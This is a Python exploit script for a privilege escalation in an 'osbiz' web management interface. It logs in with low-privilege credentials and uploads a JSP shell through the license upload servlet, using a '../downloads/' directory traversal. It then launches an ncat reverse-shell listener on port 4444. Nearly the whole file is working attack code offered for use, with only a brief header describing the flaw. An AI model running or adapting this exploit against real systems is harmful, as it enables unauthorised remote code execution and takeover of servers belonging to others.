'''
Privilige escalation possible from basic WBM user to expert role. This is possible due to:
 - Allowed any extension for license file upload, like .jsp files.
 - Directory traversal to other directory then WEB-INF (default license upload file location).
 
 *\@ braam.vanhavermaet*bkm.be
'''

import requests, urllib3, sys, os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 5:
    print(f"Usage: python3 {sys.argv[0]} <https://osbiz> <user> <passw> <jsp-file>")
    exit()
    
host, user, passw, file = sys.argv[1:]
files = {'filename':(f'../downloads/{file}', open(file, 'rb'))} #change filename so we can access our shell on the target, outside WEB-INF directory.

creds = {'errorusr': '0', 'j_username': user, 'j_password': passw}
session = requests.Session()
response = session.get(f'{host}/management/admin/', allow_redirects=True, verify=False) #get cookie
response = session.post(f'{host}/management/admin/jsp/j_security_check', data=creds, allow_redirects=True, verify=False) #login
if (response.status_code == 200):
    print("!>>->> Login OK")
else:
    print("!<<-<< Login FAILED, please check credentials.")
    exit()

response = session.post(f'{host}/management/LicCommonServlet', files=files, verify=False) #upload jsp shell
if (response.status_code == 200):
    print(f"!>>->> Shell @ {host}/management/downloads/{file}")
    print("!>>->> * Starting reverse shell listener")
    os.system('ncat -lnvp 4444')
else:
    print("!<<-<< Exploit FAILED.")
